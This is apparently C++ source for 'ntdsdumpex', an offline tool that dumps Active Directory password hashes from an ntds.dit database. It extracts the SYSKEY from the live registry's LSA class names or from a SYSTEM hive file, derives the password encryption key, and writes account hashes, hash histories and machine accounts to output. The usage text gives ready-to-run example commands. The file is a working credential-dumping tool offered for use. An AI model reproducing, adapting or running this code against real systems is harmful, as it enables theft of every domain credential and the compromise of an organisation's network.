/*
ntds.cpp from dietrich@insecurety.net,https://github.com/mubix/ntds_decode
ntreg.c from Petter N Hagen
*/

#include "ntds.h"
#include <time.h>
EXTERN_C
{
#include "ntreg.h"
}

BOOL ParseSystemKey(char* keyhex, PBYTE pKey)
{
	if (strlen(keyhex) != 32)
	{
		printf("[x]SYSKEY must be a hex-string of 32 characters\n");
		return false;
	}
	char c[] = "\0\0\0";
	char* cc = "";
	for (int i = 0; i < 16; i++)
	{
		c[0] = keyhex[i * 2];
		c[1] = keyhex[i * 2 + 1];
		pKey[i] = strtol(c, &cc, 16);
	}
	return true;
}
BOOL ReadHivemKey(char* sysfile, PBYTE pKey) {
	hive* hiv = openHive(sysfile, 0);
	if (!hiv)
	{
		printf("[x]can not open hive %s\n", sysfile);
		return false;
	}
	else
	{
		printf("[+]use hive file: %s\n", sysfile);
	}
	char* c[] = { "JD", "Skew1", "GBG", "Data", NULL };
	char box[16] = { 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 };
	char key[33] = { 0 };
	int pos = 0;
	unsigned long len = 16;
	void *val1 = get_val_data(hiv, 0, "\\Select\\Current", 0, 0);
	BYTE bSelect = ((BYTE*)val1)[0];
	for (int i = 0; c[i] != NULL; i++)
	{
		char cc[] = "\\ControlSet001\\Control\\Lsa\\\0\0\0\0\0\0\0\0\0\0\0\0";
		cc[13] = bSelect + 0x30;
		keyval* val = get_class(hiv, 0, strcat(cc, c[i]));
		if (!val)
		{
			printf("[x]hive key: %s not found\n", cc);
			return false;
		}
		for (int ii = 0; ii < 8; ii++)
		{
			key[pos] = ((char*)(&val->data))[ii * 2];
			pos++;
		}
	}
	BYTE tmp[16] = { 0 };
	if (ParseSystemKey(key, tmp))
	{
		for (int i = 0; i < 16; i++)
		{
			pKey[i] = tmp[box[i]];
		}
		return true;
	}
	return false;

}
BOOL ReadSystemKey(PBYTE pKey)
{
	char* c[] = { "JD", "Skew1", "GBG", "Data", NULL };
	char box[16] = { 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 };
	char key[33] = { 0 };
	int pos = 0;
	for (int i = 0; c[i] != NULL; i++)
	{
		char cc[80] = "SYSTEM\\CurrentControlSet\\Control\\Lsa\\\0\0\0\0\0\0\0\0\0\0\0\0";
		HKEY hkey = 0;
		RegOpenKeyExA(HKEY_LOCAL_MACHINE, strcat(cc, c[i]), 0, 0x19, &hkey);
		char tmp[16] = { 0 };
		unsigned long len = 16;
		DWORD d = 0;
		RegQueryInfoKeyA(hkey, tmp, &len, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0);
		for (int ii = 0; ii<8; ii++)
		{
			key[pos] = tmp[ii];
			pos++;
		}
		RegCloseKey(hkey);
	}
	BYTE tmp[16] = { 0 };
	if (ParseSystemKey(key, tmp))
	{
		for (int i = 0; i < 16; i++)
		{
			pKey[i] = tmp[box[i]];
		}
		return true;
	}
	return false;
}
static VOID hexdump(BYTE *data, int size) {
	for (size_t i = 0; i < size; i++) {
		printf("%02X", data[i]);
	}
	printf("\n");
}
void usage()
{
	printf(
		"usage: ntdsdumpex.exe <-d ntds.dit> <-k HEX-SYS-KEY | -s system.hiv |-r> [-o out.txt] [-h] [-m] [-p] [-u]\n"
		"-d    path of ntds.dit database\n"
		"-k    use specified SYSKEY\n"
		"-s    parse SYSKEY from specified system.hiv\n"
		"-r    read SYSKEY from registry\n"
		"-o    write output into\n"
		"-h    dump hash histories(if available)\n"
		"-p    dump description and path of home directory\n"
		//"-i    dump disabled accounts\n"
		"-m    dump machine accounts\n"
		"-u    USE UPPER-CASE-HEX\n"
		"\n"
		"\n"
		"Example : ntdsdumpex.exe -r\n"
		"Example : ntdsdumpex.exe -d ntds.dit -o hash.txt -s system.hiv\n"
		"NOTE : MUST BACKUP database file,and repair it frist(run [esentutl /p /o ntds.dit] command).\n\n"
		);
	exit(-1);
}
int main(int argc, char *argv[]) {
	setlocale(LC_ALL, "");
	printf("ntds.dit hashes off-line dumper v0.2.\n"
		"Part of GMH's fuck Tools,Code by zcgonvh.\n\n"
		);
	char *sysfile = 0;
	char *ditfile = 0;
	bool hasSYSKEY = false;
	BOOL hasInactive = TRUE;
	BOOL hasMachines = FALSE;
	BOOL hasHistory = FALSE;
	BOOL hasProfile = FALSE;
	char chFmt = 'x';
	BYTE systemkey[SYSTEM_KEY_LEN] = { 0 };
	BYTE passwordkey[PEK_VALUE_LEN] = { 0 };
	FILE* out = stdout;
	clock_t c1 = clock();
	if (argc < 2)
	{
		usage();
	}
	for (int i = 1; i <argc; i++)
	{
		if ((stricmp(argv[i], "-d") == 0) && (argc>i+1))
		{
			ditfile = argv[++i];
		}
		else if ((stricmp(argv[i], "-k") == 0) && (argc > i+1))
		{
			hasSYSKEY = ParseSystemKey(argv[++i], systemkey);
		}
		else if ((stricmp(argv[i], "-s") == 0) && (argc > i+1))
		{
			hasSYSKEY = ReadHivemKey(argv[++i], systemkey);
		}
		else if ((stricmp(argv[i], "-r") == 0) && (argc > i))
		{
			hasSYSKEY = ReadSystemKey(systemkey);
		}
		else if ((stricmp(argv[i], "-o") == 0) && (argc > i+1))
		{
			FILE* fp = fopen(argv[i + 1], "w");
			if (fp){ out = fp; }
			else
			{
				printf("[x]can not open output file %s for write.\n", argv[i + 1]);
				exit(-1);
			}
			i++;
		}
		else if ((stricmp(argv[i], "-h") == 0))
		{
			hasHistory = true;
		}
		else if ((stricmp(argv[i], "-m") == 0))
		{
			hasMachines = true;
		}
		else if ((stricmp(argv[i], "-p") == 0))
		{
			hasProfile = true;
		}
		else if ((stricmp(argv[i], "-u") == 0))
		{
			chFmt = 'X';
		}
		else if ((stricmp(argv[i], "-u") == 0))
		{
			chFmt = 'X';
		}
		/*else if ((stricmp(argv[i], "-i") == 0))
		{
		hasInactive = true;
		i++;
		}*/
		else
		{
			usage();
		}
	}
	if (!hasSYSKEY)
	{
		printf("[x]no SYSKEY set\n");
		exit(-1);
	}
	printf("[+]SYSKEY = ");
	hexdump(systemkey, SYSTEM_KEY_LEN);
	if (!ditfile)
	{
		printf("[x]no database set\n");
		exit(-1);
	}
	NTDS *ntds = new NTDS();
	if (ntds->Load(ditfile)) {
		if (ntds->GetPEKey(systemkey, passwordkey)) {
			printf("[+]PEK = ");
			hexdump(passwordkey, PEK_VALUE_LEN);
			DWORD dwAccounts = 0;
			DWORD dwMachines = 0;
			DWORD dwEntries = 0;
			DWORD dwHistory = 0;
			if (out != stdout){ printf("[+]please wait..."); }
			if (ntds->GetHashes(chFmt, hasHistory, hasInactive, hasMachines, hasProfile, out, &dwAccounts, &dwMachines, &dwEntries, &dwHistory))
			{
				clock_t c2 = clock();
				printf("\r[+]dump completed in %.3f seconds.\n", ((double)(clock() - c1) / CLOCKS_PER_SEC) , c2 - c1);
				printf("[+]total %d entries dumped,%d normal accounts,%d machines,%d histories.\n", dwEntries, dwAccounts, dwMachines, dwHistory);
			}
			else
			{
				printf("[x]can not dump hash: %s\n", ntds->GetError().c_str());
			}
		}
		else {
			printf("[x]can not get PEK!\n");
		}
		ntds->UnLoad();
	}
	else {
		printf("[x]can not load database: %s\n", ntds->GetError().c_str());
	}
	delete ntds;
}

